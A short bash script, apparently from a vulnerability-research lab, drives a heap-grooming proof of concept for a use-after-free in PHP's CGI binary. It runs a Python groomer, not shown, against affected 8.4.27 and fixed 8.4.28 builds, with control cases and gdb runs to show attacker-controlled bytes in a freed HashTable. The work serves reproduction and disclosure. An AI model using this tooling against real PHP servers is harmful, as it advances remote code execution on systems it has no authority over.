#!/bin/bash
# Stage A proof: query-string grooming of the freed startup tzcache HashTable.
# Loopback-only; all logs land in lab/build/evidence/stageA/.
set -eu
ROOT=$(cd "$(dirname "$0")/../.." && pwd)
OUT="$ROOT/lab/build/evidence/stageA"
mkdir -p "$OUT"
GROOM="$ROOT/lab/repro/php2shell-stageA-groom.py"
AFFECTED="$ROOT/lab/build/php-8.4.27-plain/sapi/cgi/php-cgi"
FIXED="$ROOT/lab/build/php-8.4.28-plain/sapi/cgi/php-cgi"

echo "=== black-box: identical groomer, affected vs fixed ==="
for qs in '' 'XXX=AAAAAAAA' 'XXX=ABCDEFGHIJ' 'XXX=AAAAAAAAAAAAAAAAAAAA'; do
    python3 "$GROOM" "$AFFECTED" "$OUT" "$qs" splice-mid
    python3 "$GROOM" "$FIXED" "$OUT" "$qs" splice-mid
done

echo "=== controls on the affected build (same long query string) ==="
for mode in valid-record valid-timezone no-cookie; do
    python3 "$GROOM" "$AFFECTED" "$OUT" 'XXX=ABCDEFGHIJ' "$mode"
done

echo "=== field proof: attacker bytes in the stale HashTable ==="
python3 "$GROOM" "$AFFECTED" "$OUT" 'XXX=ABCDEFGHIJ' splice-mid --gdb
python3 "$GROOM" "$AFFECTED" "$OUT" 'XXX=AAAAAAAAA' splice-mid --gdb

echo "logs: $OUT"
